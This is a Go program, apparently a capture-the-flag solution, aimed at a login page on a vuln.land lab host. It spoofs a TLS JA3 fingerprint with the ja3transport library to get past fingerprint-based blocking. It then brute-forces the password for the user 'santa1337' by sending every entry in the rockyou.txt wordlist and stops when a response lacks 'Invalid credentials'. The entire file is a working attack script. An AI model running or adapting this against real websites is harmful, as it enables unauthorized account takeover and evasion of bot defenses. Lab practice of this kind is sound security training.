package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"

	"github.com/CUCyber/ja3transport"
)

func main() {
	// Create an http.Transport object which can be used as a parameter for http.Client
	tr, _ := ja3transport.NewTransport("771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0")
	// Set the .Transport member of any http.Client 
	client := &http.Client{Transport: tr}
	// Make request to website using the new client
	resp, _ := client.Get("https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/")
	if resp.StatusCode == http.StatusOK {
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			panic(err)
		}
		bodyString := string(bodyBytes)
		fmt.Println(bodyString)
	}

	file, err := os.Open("./rockyou.txt")
    if err != nil {
        log.Fatal(err)
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
		password := scanner.Text()
		fmt.Println(password)
		resp, _ = client.PostForm("https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/login", 
			url.Values{"username": {"santa1337"}, "password": {password}})
		if resp.StatusCode == http.StatusOK {
			bodyBytes, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				panic(err)
			}
			bodyString := string(bodyBytes)
			if !strings.Contains(bodyString, "Invalid credentials") {
				fmt.Println(bodyString)
				os.Exit(0)
			}
		}
    }

    if err := scanner.Err(); err != nil {
        log.Fatal(err)
    }

	
}